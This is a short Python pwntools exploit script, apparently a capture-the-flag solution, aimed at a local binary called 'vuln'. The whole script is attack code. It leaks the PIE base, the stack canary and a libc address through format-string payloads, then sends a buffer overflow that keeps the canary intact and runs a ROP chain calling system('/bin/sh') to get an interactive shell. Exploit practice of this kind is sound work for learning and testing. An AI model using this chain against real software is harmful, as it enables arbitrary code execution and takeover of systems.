#!/usr/bin/env python
from pwn import *

shift_pie = 0x0#0x56b0
shift_libc = 0x114A37
canary_offset = 24 # è l'offset dal SECONDO input, occhio!
ret_offset = 8
pop_rdi = 0x000000000002a3e5
ret = 0x000000000000101a

e = ELF('vuln')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', False)
io = e.process()
# context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(io)
 
io.sendline('%15$lx-%11$lx') # PIE & CANARY
io.recvline()
leak = io.recvline()
pie = int(leak.strip().split(b'-')[0], 16) - shift_pie
canary = int(leak.strip().split(b'-')[1], 16)
log.info("Pie: %s" % hex(pie))
log.info("Canary: %s" % hex(canary))
log.info("Main: %s" % hex(e.sym['main']))

payload = flat(
        "A"*canary_offset,
        canary,
        "B"*ret_offset,
        # pie + ret,
        pie + 0x4,#  + e.sym['main'],
        endianness = 'little', word_size = 64, sign = False)

log.info(payload)

io.sendline(payload)

io.sendline('%3$lx') # libc
io.recvline()
leak = io.recvline()
libc.address = int(leak.strip(), 16) - shift_libc
log.info("Libc: %s" % hex(libc.address))
payload = flat(
        "A"*canary_offset,
        canary, 
        "B"*ret_offset,
        pie + pop_rdi,
        next(libc.search('/bin/sh')),
        libc.sym['system'],
        endianness = 'little', word_size = 64, sign = False)
io.sendline(payload)
io.interactive()